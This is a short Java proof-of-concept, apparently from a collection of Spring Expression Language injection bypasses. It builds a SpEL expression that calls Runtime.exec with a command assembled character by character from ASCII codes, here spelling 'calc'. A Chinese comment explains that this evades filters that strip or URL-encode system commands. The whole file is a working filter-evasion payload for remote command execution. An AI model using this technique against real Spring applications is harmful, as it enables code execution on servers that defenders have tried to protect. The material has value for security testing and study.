package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;


// 当执行的系统命令被过滤或者被URL编码掉时，可以通过 String 类动态生成字符，Part2
// byte 数组内容的生成后面有脚本
public class AsciiSplicingBypass {
    public static void main(String[] args) {
        String spel = "T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
